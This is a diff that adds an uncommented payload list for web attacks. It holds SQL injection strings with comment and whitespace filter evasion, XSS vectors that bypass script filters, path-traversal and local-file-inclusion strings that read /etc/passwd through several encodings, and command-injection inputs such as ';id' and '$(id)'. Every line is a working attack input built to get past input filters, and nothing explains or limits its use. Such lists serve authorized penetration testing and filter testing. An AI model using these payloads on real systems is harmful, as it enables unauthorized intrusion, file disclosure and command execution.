@@ -1,0 +1,43 @@
+# SQL comment injection
+'/*!50000OR*/1=1-- -
+'/**/OR/**/1=1-- -
+'%09OR%091=1-- -
+'%0AOR%0A1=1-- -
+'/*!50000UNION*//*!50000SELECT*/NULL-- -
+1'/**/UNION/**/SELECT/**/NULL-- -
+'||'1'='1
+'^'1'='1
+# XSS whitespace bypass
+<svg/onload=alert(1)>
+<svg%0aonload=alert(1)>
+<svg%09onload=alert(1)>
+<img/src=x/onerror=alert(1)>
+<img%09src=x%09onerror=alert(1)>
+<scr<script>ipt>alert(1)</scr</script>ipt>
+<SCRIPT>alert(1)</SCRIPT>
+<ScRiPt>alert(1)</ScRiPt>
+<svg><script x>alert(1)</script></svg>
+# LFI traversal
+....//....//....//etc/passwd
+..%252f..%252f..%252fetc%252fpasswd
+%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
+%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd
+..%c0%af..%c0%af..%c0%afetc/passwd
+# Path traversal
+//etc/passwd
+///etc/passwd
+/./etc/passwd
+/etc//passwd
+/etc/./passwd
+/..;/etc/passwd
+/%2e%2e/etc/passwd
+# RCE
+;id
+%3bid
+%0aid
+|id
+%7cid
+`id`
+%60id%60
+$(id)
+%24(id)
